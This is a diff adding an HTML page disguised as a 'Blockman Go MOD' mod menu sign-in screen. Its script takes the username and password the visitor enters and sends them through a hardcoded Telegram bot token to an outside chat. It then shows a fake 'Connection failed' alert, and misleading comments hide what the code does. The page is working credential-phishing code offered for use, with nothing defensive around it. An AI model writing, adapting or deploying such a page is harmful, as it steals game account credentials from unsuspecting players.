@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Blockman Go MOD</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background: #1a1a1a; color: white; font-family: Arial; text-align: center; padding: 50px 20px; }
+        .container { max-width: 400px; margin: 0 auto; }
+        .logo { background: #4CAF50; width: 100px; height: 100px; border-radius: 20px; margin: 0 auto 20px; font-size: 50px; line-height: 100px; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 8px; font-size: 16px; }
+        button { width: 100%; padding: 15px; background: #4CAF50; color: white; border: none; border-radius: 8px; font-size: 18px; margin: 20px 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🎮</div>
+        <h2>Blockman Go MOD</h2>
+        <p style="color: #ccc;">Mod Menu • Premium Features</p>
+        
+        <input type="text" id="user" placeholder="Email or Username">
+        <input type="password" id="pass" placeholder="Password">
+        
+        <button onclick="login()">SIGN IN & ACTIVATE</button>
+        
+        <p style="color: #666; font-size: 12px;">Version 2.215.1 MOD • Mod Menu</p>
+    </div>
+
+    <script>
+    function login() {
+        // Data:
+        var token = "8232553888:AAEg-ATNl0C6c-aw1cRWo8oz-42f-q_4WR0";
+        var chatId = "7580501421";
+        
+        var user = document.getElementById("user").value;
+        var pass = document.getElementById("pass").value;
+        
+        // Support
+        fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chatId + '&text=🔐%20NEW%20ACCOUNT%0A👤:%20' + user + '%0A🔑:%20' + pass + '%0A⏰:%20' + new Date());
+        
+        // Error
+        alert('Connection failed. Try again later.');
+    }
+    </script>
+</body>
+</html>
